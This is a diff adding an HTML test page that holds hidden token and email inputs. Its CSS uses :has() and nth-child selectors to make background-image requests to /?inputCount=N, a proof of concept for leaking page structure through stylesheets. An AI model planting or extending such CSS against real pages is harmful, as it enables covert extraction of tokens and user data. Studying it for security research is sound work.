@@ -1,0 +1,17 @@
+<input type="hidden" name="mytoken" value="ddaf35a193617abacc417349ae204">
+<input type="hidden" name="email" value="gareth.heyes@portswigger.net">
+
+<style>
+body:has(input:nth-child(1)) {
+    --inputCount: url(/?inputCount=1);
+}
+body:has(input:nth-child(2)) {
+    --inputCount: url(/?inputCount=2);
+}
+body:has(input:nth-child(3)) {
+    --inputCount: url(/?inputCount=3);
+}
+body {
+    background:var(--inputCount,none);
+}
+</style>
